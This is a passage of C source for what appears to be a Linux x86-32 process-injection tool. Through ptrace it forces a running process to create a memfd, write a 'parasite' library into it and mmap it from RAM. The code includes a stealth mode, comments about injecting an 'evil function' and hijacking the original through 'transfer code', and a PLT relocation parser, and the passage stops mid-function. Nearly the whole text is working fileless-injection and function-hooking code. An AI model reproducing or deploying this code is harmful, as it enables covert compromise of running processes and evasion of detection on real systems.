#include <ctype.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <signal.h>
#include <unistd.h>
#include "ae_log.h"

typedef unsigned char bool;
typedef unsigned long ulong_t;
typedef unsigned char uchar_t;

#define false 0;
#define true  1;

#define MAXBUF 256
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/* memfd_create syscall number for x86_32 */
#ifndef SYS_memfd_create
#define SYS_memfd_create 356
#endif

/* memfd_create flags */
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

/* symbol relocation info */
struct ae_sym {
	int count;
	char name[MAXBUF];
	int index;
	uint32_t offset;
};

struct ae_sym_info {
	int count;
	struct ae_sym syms[0];
};

/* options for the program */
struct ae_opts {
	bool stealth;
	int pid;
	char * func;
	char * libname;
};

typedef enum ae_seg_type {
	TYPE_TEXT = 0,
	TYPE_DATA = 1,
} ae_seg_type_t;

struct ae_segment {
	ulong_t base;
	ulong_t offset;
	ulong_t len;
}; 

// captures information about our parasite library
struct ae_segments {
	struct ae_segment segs[2];
};
	

static ulong_t ae_original;
static ulong_t ae_text_base;
static ulong_t ae_data_base;
static bool ae_stealth_mode = false;

/* Forward declarations */
/* --- Helper prototypes --- */
static int ae_is_address_mapped(int pid, ulong_t addr, size_t size);
static int ae_ensure_stopped(int pid);
static ulong_t ae_find_sysenter(int pid, ulong_t start, ulong_t end, size_t max_search_size, size_t chunk_size);
static void ae_show_progress_bar(ulong_t current, ulong_t total, const char * status, int done);
static inline void ae_ptrace_cpy_from(ulong_t * dst, ulong_t src, size_t size, int pid);
static inline void ae_ptrace_cpy_to(ulong_t dst, ulong_t * src, size_t size, int pid);

/* --- Helper implementations --- */
static int ae_is_address_mapped(int pid, ulong_t addr, size_t size) {
    char maps_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    FILE *f = fopen(maps_path, "r");
    if (!f)
        return 0;
    char line[256];
    ulong_t start, end;
    int mapped = 0;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
            if (addr >= start && (addr + size) <= end) {
                mapped = 1;
                break;
            }
        }
    }
    fclose(f);
    return mapped;
}

static int ae_ensure_stopped(int pid) {
    int status;
    /* Non-blocking check for pending status */
    if (waitpid(pid, &status, WNOHANG) > 0 && WIFSTOPPED(status))
        return 0;
    
    /* Check if process is already stopped by checking /proc/pid/stat */
    /* State 't' (traced/stopped) or 'T' (stopped) means already stopped */
    char stat_path[64];
    char stat_line[512];
    FILE *stat_file;
    snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", pid);
    stat_file = fopen(stat_path, "r");
    if (stat_file) {
        if (fgets(stat_line, sizeof(stat_line), stat_file)) {
            /* State is the 3rd field in /proc/pid/stat (after the ')' from process name) */
            char *state = strchr(stat_line, ')');
            if (state && (state[2] == 'T' || state[2] == 't')) {
                /* Process is already stopped */
                fclose(stat_file);
                return 0;
            }
        }
        fclose(stat_file);
    }
    
    /* Process is not stopped, send SIGSTOP */
    if (kill(pid, SIGSTOP) == -1)
        return -1;
    if (waitpid(pid, &status, WUNTRACED) == -1)
        return -1;
    if (!WIFSTOPPED(status))
        return -1;
    return 0;
}

/* --- End helper implementations --- */
static void
ae_show_progress_bar (ulong_t current,
		      ulong_t total,
		      const char * status,
		      int done)
{
	static int use_tty = -1;

	/* Skip progress output in stealth mode */
	if (ae_stealth_mode)
		return;

	if (use_tty == -1)
		use_tty = isatty(fileno(stderr));
	if (!use_tty)
		return;

	if (total == 0)
		total = 1;
	if (current > total)
		current = total;

	unsigned long percent = (current * 100UL) / total;
	const int bar_width = 40;
	int filled = (int)((percent * bar_width) / 100UL);

	/* Carriage return and clear line for single-line updates */
	fprintf(stderr, "\r\033[K[");
	for (int i = 0; i < bar_width; i++) {
		if (i < filled)
			fputc('=', stderr);
		else if (i == filled)
			fputc('>', stderr);
		else
			fputc(' ', stderr);
	}
	fprintf(stderr, "] %3lu%% %s", percent, status ? status : "");
	if (done)
		fputc('\n', stderr);
	fflush(stderr);
}

static inline void ae_ptrace_cpy_to(ulong_t dst, ulong_t * src, size_t size, int pid);

// includes byte-based signatures of our evil function and
// the address we need to patch to transfer back to the 
// original (innocuous) function (our "transfer code")
#include "ae_signatures.h"


/* read library file from disk into buffer */
static uchar_t *
ae_read_library_file (char * libname, size_t * lib_size)
{
	char libpath[MAXBUF];
	int fd;
	struct stat st;
	uchar_t * buf = NULL;
	ssize_t bytes_read;

	snprintf(libpath, MAXBUF, "/lib/%s", libname);

	fd = open(libpath, O_RDONLY);
	if (fd == -1) {
		ae_log(AE_LOG_ERROR, "Could not open library file: %s", libpath);
		return NULL;
	}

	if (fstat(fd, &st) < 0) {
		ae_log(AE_LOG_ERROR, "Could not stat library file");
		close(fd);
		return NULL;
	}

	*lib_size = st.st_size;
	buf = (uchar_t *)malloc(st.st_size);
	if (!buf) {
		ae_log(AE_LOG_ERROR, "Could not allocate buffer for library");
		close(fd);
		return NULL;
	}

	bytes_read = read(fd, buf, st.st_size);
	if (bytes_read != st.st_size) {
		ae_log(AE_LOG_ERROR, "Could not read complete library file");
		free(buf);
		close(fd);
		return NULL;
	}

	close(fd);
	ae_log(AE_LOG_DEBUG, "Read %zu bytes from %s", *lib_size, libpath);
	return buf;
}


/* force target process to call memfd_create via ptrace */
static int
ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
{
	struct user_regs_struct reg;
	int i, memfd = -1;
	ulong_t name_addr;
	char saved_data[MAXBUF];
	size_t name_len = strlen(name) + 1;

	/* Ensure process is stopped by sending a signal and waiting */
	int status;
	if (kill(pid, SIGSTOP) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to send SIGSTOP: %s", strerror(errno));
	}
	waitpid(pid, &status, WUNTRACED);
	
	if (!WIFSTOPPED(status)) {
		ae_log(AE_LOG_ERROR, "Process is not stopped (status: 0x%x)", status);
		return -1;
	}
	
	/* Get fresh register state - ensure process is stopped */
	if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to get registers: %s", strerror(errno));
		return -1;
	}

	/* Use stack pointer - it's always writable and accessible */
	/* On 32-bit Linux, stack is typically in upper address space (0x80000000+) */
	/* Calculate a safe address below the current stack pointer */
	ulong_t stack_limit = 0x1000;  /* Absolute minimum */
	if (reg.esp < 0x80000000) {
		/* Stack might be in lower address space, use a different limit */
		stack_limit = 0x1000;
	} else {
		/* Stack in upper address space, use higher limit */
		stack_limit = 0x40000000;
	}
	
	if (reg.esp < stack_limit + name_len + 256) {
		ae_log(AE_LOG_ERROR, "Stack pointer too low: 0x%lx", reg.esp);
		return -1;
	}
	
	/* Allocate space on stack, aligned to 4 bytes, with some margin */
	name_addr = (reg.esp & ~0x3) - (name_len + 64);
	
	/* Ensure we don't go below a reasonable limit */
	if (name_addr < stack_limit) {
		ae_log(AE_LOG_ERROR, "Calculated stack address too low: 0x%lx (esp: 0x%lx, limit: 0x%lx)", 
		       name_addr, reg.esp, stack_limit);
		return -1;
	}
	
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Using stack address 0x%lx for memfd name (esp: 0x%lx)", name_addr, reg.esp);
	
	/* Test if we can read from this address first */
	errno = 0;
	long test_read = ptrace(PTRACE_PEEKTEXT, pid, name_addr);
	if (test_read == -1 && errno) {
		ae_log(AE_LOG_ERROR, "Cannot read from stack address 0x%lx: %s", name_addr, strerror(errno));
		/* Try a different offset */
		name_addr = (reg.esp & ~0x3) - 256;
		if (name_addr < stack_limit) {
			ae_log(AE_LOG_ERROR, "Alternative stack address also too low: 0x%lx", name_addr);
			return -1;
		}
		test_read = ptrace(PTRACE_PEEKDATA, pid, name_addr);
		if (test_read == -1 && errno) {
			ae_log(AE_LOG_ERROR, "Cannot read from alternative stack address 0x%lx: %s", name_addr, strerror(errno));
			return -1;
		}
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Using alternative stack address 0x%lx", name_addr);
	}
	
	/* backup area where we'll store the memfd name */
	ae_ptrace_cpy_from((ulong_t*)saved_data, name_addr, name_len + 16, pid);

	/* write the memfd name to target's data segment */
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Writing memfd name '%s' to 0x%lx", name, name_addr);
	ae_ptrace_cpy_to(name_addr, (ulong_t*)name, name_len, pid);
	
	/* Verify the write succeeded */
	char verify_buf[MAXBUF] = {0};
	ae_ptrace_cpy_from((ulong_t*)verify_buf, name_addr, name_len, pid);
	if (strncmp(verify_buf, name, name_len) != 0) {
		ae_log(AE_LOG_ERROR, "Failed to verify memfd name write");
		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
		return -1;
	}
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Verified memfd name written successfully");

	/* save original registers */
	long orig_eax = reg.eax;
	long orig_ebx = reg.ebx;
	long orig_ecx = reg.ecx;
	long orig_edx = reg.edx;
	long orig_eip = reg.eip;

	/* setup memfd_create syscall: memfd_create(name, MFD_CLOEXEC) */
	reg.eax = SYS_memfd_create;
	reg.ebx = name_addr;
	reg.ecx = MFD_CLOEXEC;
	reg.eip = sysenter;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to set registers: %s", strerror(errno));
		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
		return -1;
	}

	/* execute the syscall */
	int step_status;
	for (i = 0; i < 10; i++) {
		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
			ae_log(AE_LOG_ERROR, "PTRACE_SINGLESTEP failed: %s", strerror(errno));
			break;
		}
		waitpid(pid, &step_status, 0);
		if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
			ae_log(AE_LOG_ERROR, "Failed to get registers after step: %s", strerror(errno));
			break;
		}
		if (reg.eax != SYS_memfd_create) {
			memfd = (int)reg.eax;
			break;
		}
	}

	if (memfd < 0) {
		ae_log(AE_LOG_ERROR, "memfd_create failed: %d (errno: %s)", memfd, strerror(errno));
		/* Verify the name address is still valid */
		char verify_buf[MAXBUF] = {0};
		ae_ptrace_cpy_from((ulong_t*)verify_buf, name_addr, name_len, pid);
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Name at 0x%lx contains: '%s'", name_addr, verify_buf);
		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Created memfd: %d", memfd);

	/* restore data segment area */
	ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);

	/* restore registers */
	reg.eax = orig_eax;
	reg.ebx = orig_ebx;
	reg.ecx = orig_ecx;
	reg.edx = orig_edx;
	reg.eip = orig_eip;
	ptrace(PTRACE_SETREGS, pid, NULL, &reg);

	return memfd;
}


/* write library bytes to memfd in target process */
static int
ae_write_to_memfd (int pid, ulong_t sysenter, int memfd, uchar_t * data, size_t data_size)
{
	struct user_regs_struct reg;
	size_t offset = 0;
	size_t chunk_size;
	size_t write_buf_size = 4096; /* write in 4KB chunks */
	int i;
	ssize_t written;

	ptrace(PTRACE_GETREGS, pid, NULL, &reg);

	/* save original registers */
	long orig_eax = reg.eax;
	long orig_ebx = reg.ebx;
	long orig_ecx = reg.ecx;
	long orig_edx = reg.edx;
	long orig_eip = reg.eip;

	while (offset < data_size) {
		chunk_size = (data_size - offset > write_buf_size) ? write_buf_size : (data_size - offset);

		/* write chunk to target's data segment */
		ae_ptrace_cpy_to(ae_data_base, (ulong_t*)(data + offset), chunk_size, pid);

		/* setup write syscall: write(memfd, buf, chunk_size) */
		reg.eax = SYS_write;
		reg.ebx = memfd;
		reg.ecx = ae_data_base;
		reg.edx = chunk_size;
		reg.eip = sysenter;

		ptrace(PTRACE_SETREGS, pid, NULL, &reg);

		/* execute the syscall */
		written = -1;
		int step_status;
		for (i = 0; i < 5; i++) {
			ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
			waitpid(pid, &step_status, 0);
			ptrace(PTRACE_GETREGS, pid, NULL, &reg);
			if (reg.eax != SYS_write) {
				written = (ssize_t)reg.eax;
				break;
			}
		}

		if (written != chunk_size) {
			ae_log(AE_LOG_ERROR, "write to memfd failed: wrote %ld of %zu bytes", written, chunk_size);
			return -1;
		}

		offset += chunk_size;
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Wrote %zu/%zu bytes to memfd", offset, data_size);
	}

	/* restore registers */
	reg.eax = orig_eax;
	reg.ebx = orig_ebx;
	reg.ecx = orig_ecx;
	reg.edx = orig_edx;
	reg.eip = orig_eip;
	ptrace(PTRACE_SETREGS, pid, NULL, &reg);

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Successfully wrote %zu bytes to memfd %d", data_size, memfd);
	return 0;
}


/* copy size bytes from target memory */
static inline void
ae_ptrace_cpy_from (ulong_t * dst,
			ulong_t src,
			size_t size,
			int pid)
{
	int i;
	long ret;

	for (i = 0; i < (size+sizeof(ulong_t)-1)/sizeof(ulong_t); i++) {
		errno = 0;
		/* Use PEEKTEXT consistently for reads */
		ret = ptrace(PTRACE_PEEKTEXT, pid, src + i*sizeof(ulong_t));
		if (ret == -1 && errno) {
			/* Only log if it's not EIO (unmapped memory) - expected during search */
			if (errno != EIO) {
				ae_log(AE_LOG_ERROR, "Ptrace PEEKTEXT failed at 0x%lx (iteration %d/%zu): %s", 
				       src + i*sizeof(ulong_t), i, (size+sizeof(ulong_t)-1)/sizeof(ulong_t), strerror(errno));
			}
			/* Set errno so caller knows read failed */
			errno = EIO;
			return;
		}
		dst[i] = ret;
	}
	errno = 0; /* Clear errno on success */
}

static ulong_t
ae_find_sysenter (int pid,
		  ulong_t start,
		  ulong_t end,
		  size_t max_search_size,
		  size_t chunk_size)
{
	unsigned char buf[4096];
	ulong_t found = 0;

	/* clamp chunk size to buffer and ensure minimum size */
	if (chunk_size < 2)
		chunk_size = 2;
	if (chunk_size > sizeof(buf))
		chunk_size = sizeof(buf);

	if (end <= start)
		return 0;

	/* determine actual search limit and guard against overflow */
	ulong_t limit = start + max_search_size;
	if (limit > end || limit < start)
		limit = end;

	if (limit - start < 2)
		return 0;

	ulong_t total = limit - start;
	ulong_t bytes_searched = 0;
	const char *progress_status = "Searching for sysenter...";

	if (!ae_stealth_mode)
		ae_show_progress_bar(0, total, progress_status, 0);

	for (ulong_t addr = start; addr < limit && !found; addr += chunk_size) {
		size_t remaining = (size_t)(limit - addr);
		size_t read_size = (remaining > chunk_size) ? chunk_size : remaining;
		if (read_size < 2)
			break;

		errno = 0;
		ae_ptrace_cpy_from((ulong_t*)buf, addr, read_size, pid);
		if (errno == 0) {
			bytes_searched += read_size;
			for (size_t i = 0; i + 1 < read_size; i++) {
				if (buf[i] == 0x0f && buf[i + 1] == 0x34) {
					found = addr + i;
					if (found >= 5)
						found -= 5;
					if (!ae_stealth_mode) {
						ae_show_progress_bar(bytes_searched, total, "Sysenter found!", 0);
						ae_show_progress_bar(total, total, "Sysenter found!", 1);
					}
					break;
				}
			}
		} else {
			/* Skip unreadable regions - this is normal when searching */
			/* Don't log errors for expected unreadable memory */
			continue;
		}

		if (!ae_stealth_mode)
			ae_show_progress_bar(bytes_searched, total, progress_status, 0);
	}

	if (!found && !ae_stealth_mode)
		ae_show_progress_bar(bytes_searched, total, "Sysenter not found", 1);

	return found;
}


/* copy size bytes to target memory */
static inline void
ae_ptrace_cpy_to (ulong_t dst,
			ulong_t * src,
			size_t size,
			int pid)
{
	int i;
	for (i = 0; i < (size+sizeof(ulong_t)-1) / sizeof(ulong_t); i++) {
		errno = 0;
		/* Use POKETEXT consistently for writes */
		long ret = ptrace(PTRACE_POKETEXT, pid, dst + (i*sizeof(ulong_t)), src[i]);
		if (ret == -1 && errno) {
			ae_log(AE_LOG_ERROR, "Ptrace POKEDATA failed at 0x%lx (iteration %d/%zu): %s", 
			       dst + (i*sizeof(ulong_t)), i, (size+sizeof(ulong_t)-1)/sizeof(ulong_t), strerror(errno));
			/* Try POKETEXT as fallback */
			errno = 0;
			ret = ptrace(PTRACE_POKETEXT, pid, dst + (i*sizeof(ulong_t)), src[i]);
			if (ret == -1 && errno) {
				ae_log(AE_LOG_ERROR, "Ptrace POKETEXT fallback also failed: %s", strerror(errno));
				return;
			}
		}
	}
}


// the transfer code gets us back (via function pointer usually)
// to the *original* function (the one we're overriding)
static void
ae_inject_transfer_code (int pid, ulong_t target_addr, ulong_t newval)
{
	ae_log(AE_LOG_DEBUG, "Injecting %lx at 0x%lx", newval, target_addr);
	ptrace(PTRACE_POKETEXT, pid, target_addr, newval);
}


/* Phantom Load: creates memfd in target process and loads library from RAM */
static int
ae_phantom_load (int pid, char * libname, ulong_t sysenter, int * memfd_out)
{
	uchar_t * lib_data = NULL;
	size_t lib_size = 0;
	int memfd = -1;
	char memfd_name[MAXBUF];
	struct user_regs_struct reg;

	/* Ensure process is stopped */
	if (ae_ensure_stopped(pid) == -1) {
		ae_log(AE_LOG_ERROR, "Target not stopped before phantom_load");
		return -1;
	}
	/* Get fresh register state */
	if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to get registers in phantom_load: %s", strerror(errno));
		return -1;
	}

	/* read the library file in injector process */
	lib_data = ae_read_library_file(libname, &lib_size);
	if (!lib_data) {
		ae_log(AE_LOG_ERROR, "Failed to read library file");
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Loaded library %s (%zu bytes) into injector memory", libname, lib_size);

	/* create a memfd in the target process */
	snprintf(memfd_name, MAXBUF, "phantom_%s", libname);
	memfd = ae_force_memfd_create(pid, sysenter, memfd_name);
	if (memfd < 0) {
		ae_log(AE_LOG_ERROR, "Failed to create memfd in target process");
		free(lib_data);
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Created memfd %d in target process", memfd);

	/* write library data to the memfd */
	if (ae_write_to_memfd(pid, sysenter, memfd, lib_data, lib_size) < 0) {
		ae_log(AE_LOG_ERROR, "Failed to write library to memfd");
		free(lib_data);
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Phantom Load complete: library loaded in RAM via memfd %d", memfd);

	free(lib_data);
	*memfd_out = memfd;
	return 0;
}


static void
ae_dump_buf (uchar_t * buf, size_t size)
{
	int i;
	for (i = 0; i < size; i++) {
		if ((i % 20) == 0)
			ae_log(AE_LOG_INFO, "");
		fprintf(stderr, "\\x%.2x", buf[i]);
	}
	ae_log(AE_LOG_INFO, "");
}


/* 
 * Uses Phantom Load to mmap() our library directly from RAM
 * No shellcode injection - uses direct ptrace syscall manipulation
 */
static int 
ae_mmap_library (int pid, 
				char * libname,
				ulong_t * evilbase, 
				struct ae_segments * segs)
{
	struct user_regs_struct reg;
	long eip, esp, offset,
         eax, ebx, ecx, edx;
	int i, fd, memfd, status;
	char library_string[MAXBUF] = {0};
	char orig_ds[MAXBUF] = {0};
	char buf[MAXBUF] = {0};
	ulong_t sysenter = 0;
	size_t search_stages[] = {0x1000, 0x4000, 0x10000};
	size_t sysenter_chunk = 1024;
	long syscall_eip;

	/* Verify target stopped */
	if (ae_ensure_stopped(pid) == -1) {
		ae_log(AE_LOG_ERROR, "Target not stopped before mmap_library initial");
		return -1;
	}
	/* Get current register state */
	if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to get initial registers: %s", strerror(errno));
		return -1;
	}

	eip = reg.eip;
	esp = reg.esp;
	eax = reg.eax;
	ebx = reg.ebx;
	ecx = reg.ecx;
	edx = reg.edx;

	// Find sysenter by searching in libc (most reliable location)
	// libc's syscall wrapper always contains sysenter
	char maps_path[64];
	FILE *maps_file;
	char line[1024];
	ulong_t start, end;
	
	snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
	maps_file = fopen(maps_path, "r");
	if (maps_file) {
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Searching for sysenter in libc mappings (staged: 4KB/16KB/64KB)");
		while (fgets(line, sizeof(line), maps_file) && !sysenter) {
			// Look for libc executable mappings
			if (strstr(line, "libc") && strstr(line, "r-xp")) {
				if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
					ulong_t mapping_len = end - start;
					for (size_t s = 0; s < sizeof(search_stages)/sizeof(search_stages[0]) && !sysenter; s++) {
						size_t max_search = search_stages[s];
						if (max_search > mapping_len)
							max_search = mapping_len;
						sysenter = ae_find_sysenter(pid, start, end, max_search, sysenter_chunk);
					}
				}
			}
		}
		fclose(maps_file);
	}
	
	// Fallback: search around current EIP if libc search failed
	if (!sysenter) {
		ulong_t search_start = (reg.eip > 0x1000) ? (reg.eip - 0x1000) : 0x1000;
		ulong_t search_end = reg.eip + 0x1000;
		
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Libc search failed, trying around EIP 0x%lx", reg.eip);
		
		sysenter = ae_find_sysenter(pid, search_start, search_end, search_end - search_start, sysenter_chunk);
	}

	if (!sysenter) {
		ae_log(AE_LOG_ERROR, "Unable to find sysenter instruction in memory");
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Sysenter found: 0x%lx", sysenter);

	/* We're already attached and stopped, no need to detach/re-attach */
	/* Just refresh register state */
	if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to get registers: %s", strerror(errno));
		return -1;
	}
	
	/* Update saved register values */
	eip = reg.eip;
	esp = reg.esp;
	eax = reg.eax;
	ebx = reg.ebx;
	ecx = reg.ecx;
	edx = reg.edx;
	
	/* Set ptrace options to ensure proper behavior */
	if (ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESYSGOOD) == -1) {
		/* Non-fatal, just log */
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Could not set ptrace options: %s", strerror(errno));
	}

	// *** PHANTOM LOAD: use memfd_create instead of opening from disk ***
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Initiating Phantom Load for %s", libname);
	if (ae_phantom_load(pid, libname, sysenter, &memfd) < 0) {
		ae_log(AE_LOG_ERROR, "Phantom Load failed");
		return -1;
	}

	// construct /proc/self/fd/<memfd> path for mmap
	snprintf(library_string, MAXBUF, "/proc/self/fd/%d", memfd);
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Library loaded in RAM, accessible via: %s", library_string);

	/* Use stack to store the library string (stack is always writable) */
	/* Ensure we don't go below a reasonable stack limit */
	ulong_t stack_limit = 0x1000;
	size_t str_len = strlen(library_string) + 1;
	ulong_t string_addr = (reg.esp & ~0x3) - (str_len + 64);
	
	if (!ae_is_address_mapped(pid, string_addr, str_len) || string_addr < stack_limit) {
		ae_log(AE_LOG_ERROR, "Calculated string address too low: 0x%lx", string_addr);
		return -1;
	}
	
	/* backup stack area */
	ae_ptrace_cpy_from((ulong_t*)orig_ds, string_addr, str_len + 32, pid);

	/* store our memfd path string on stack */
	ae_ptrace_cpy_to(string_addr, (ulong_t*)library_string, str_len, pid);

	/* verify we have the correct string */
	ae_ptrace_cpy_from((ulong_t*)buf, string_addr, str_len, pid);

	if (strncmp(buf, library_string, str_len) == 0) {
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Verified string is stored on stack: %s", buf);
	} else {
		ae_log(AE_LOG_ERROR, "String was not properly stored on stack: %s", buf);
		return -1;
	}

	// we force an open() of the memfd path /proc/self/fd/<memfd>
	reg.eax = SYS_open;
	reg.ebx = (long)string_addr;
	reg.ecx = 0;  
	reg.eip = sysenter;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to set registers for open: %s", strerror(errno));
		return -1;
	}

	// force the pseudo-syscall
	fd = -1;
	for (i = 0; i < 10; i++) {
		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
			ae_log(AE_LOG_ERROR, "PTRACE_SINGLESTEP failed for open: %s", strerror(errno));
			break;
		}
		int step_status;
		waitpid(pid, &step_status, 0);
		if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
			ae_log(AE_LOG_ERROR, "Failed to get registers after open step: %s", strerror(errno));
			break;
		}
		if (reg.eax != SYS_open) {
			fd = (int)reg.eax;
			break;
		}
	}
	
	if (fd < 0) {
		ae_log(AE_LOG_ERROR, "Failed to open memfd path");
		return -1;
	}

	offset = (string_addr + str_len) + 8;

	reg.eip = sysenter;
	reg.eax = SYS_mmap;
	reg.ebx = offset;

	// setup arguments for mmap() 
	ptrace(PTRACE_POKETEXT, pid, offset, 0);
	ptrace(PTRACE_POKETEXT, pid, offset + 4,
		   segs->segs[TYPE_TEXT].len + (PAGE_SIZE - (segs->segs[TYPE_TEXT].len & (PAGE_SIZE - 1))));
	ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);   // PROT_READ | PROT_EXEC
	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);  // MAP_SHARED
	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
	ptrace(PTRACE_POKETEXT, pid, offset + 20,
           segs->segs[TYPE_TEXT].offset & ~(PAGE_SIZE - 1));

	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to set registers for mmap: %s", strerror(errno));
		return -1;
	}

	// force the pseudo-syscall
	*evilbase = 0;
	for (i = 0; i < 10; i++) {
		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
			ae_log(AE_LOG_ERROR, "PTRACE_SINGLESTEP failed for mmap: %s", strerror(errno));
			break;
		}
		int step_status;
		waitpid(pid, &step_status, 0);
		if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
			ae_log(AE_LOG_ERROR, "Failed to get registers after mmap step: %s", strerror(errno));
			break;
		}
		if (reg.eax != SYS_mmap) {
			*evilbase = reg.eax;
			break;
		}
	}
	
	if (*evilbase == 0 || *evilbase == (ulong_t)-1) {
		ae_log(AE_LOG_ERROR, "mmap failed or returned invalid address: 0x%lx", *evilbase);
		return -1;
	}

	reg.eip = sysenter;
	reg.eax = SYS_mmap;
	reg.ebx = offset;

	// mmap() the data segment as well
	ptrace(PTRACE_POKETEXT, pid, offset, 0);
	ptrace(PTRACE_POKETEXT, pid, offset + 4, segs->segs[TYPE_DATA].len + (PAGE_SIZE - (segs->segs[TYPE_DATA].len & (PAGE_SIZE - 1))));
	ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);   // PROT_READ | PROT_WRITE
	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);  // MAP_SHARED
	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd);
	ptrace(PTRACE_POKETEXT, pid, offset + 20, segs->segs[TYPE_DATA].offset & ~(PAGE_SIZE - 1));

	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to set registers for data mmap: %s", strerror(errno));
		return -1;
	}

	// force the pseudo-syscall for data segment
	for (i = 0; i < 10; i++) {
		if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
			ae_log(AE_LOG_ERROR, "PTRACE_SINGLESTEP failed for data mmap: %s", strerror(errno));
			break;
		}
		int step_status;
		waitpid(pid, &step_status, 0);
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Restoring stack");
	ae_ptrace_cpy_to(string_addr, (ulong_t*)orig_ds, str_len + 32, pid);

	reg.eip = eip;
	reg.eax = eax;
	reg.ebx = ebx;
	reg.ecx = ecx;
	reg.edx = edx;
	reg.esp = esp;

	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
		ae_log(AE_LOG_ERROR, "Could not detach from target");
		exit(EXIT_FAILURE);
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Phantom Load mmap complete, evilbase: 0x%lx", *evilbase);
	return 0;
}


/* this parses the R_386_JUMP_SLOT relocation entries 
 * from our process 
 */
static struct ae_sym_info * 
ae_get_plt (uchar_t * mem) 
{
	Elf32_Ehdr *ehdr;
	Elf32_Shdr *shdr, *shdrp, *strtab;
	Elf32_Sym *syms, *symsp;
	Elf32_Rel *rel;

	char * symname = NULL;
	int i, j, k, symcount;

	struct ae_sym_info * sinfo = NULL;

	ehdr = (Elf32_Ehdr*)mem;
	shdr = (Elf32_Shdr*)(mem + ehdr->e_shoff);

	shdrp = shdr;

	for (i = 0; i < ehdr->e_shnum; i++, shdrp++) {

		// we're looking for the dynamic symbol table here
		if (shdrp->sh_type == SHT_DYNSYM) {

			// section hdr index of associated string table
			strtab = &shdr[shdrp->sh_link];

			if ((symname = malloc(strtab->sh_size)) == NULL)
				return NULL;

			memcpy(symname, mem + strtab->sh_offset, strtab->sh_size);

			if ((syms = (Elf32_Sym *)malloc(shdrp->sh_size)) == NULL)
				return NULL;

			memcpy((Elf32_Sym*)syms, (Elf32_Sym*)(mem + shdrp->sh_offset), shdrp->sh_size);

			symsp = syms;

			symcount = shdrp->sh_size / sizeof(Elf32_Sym);

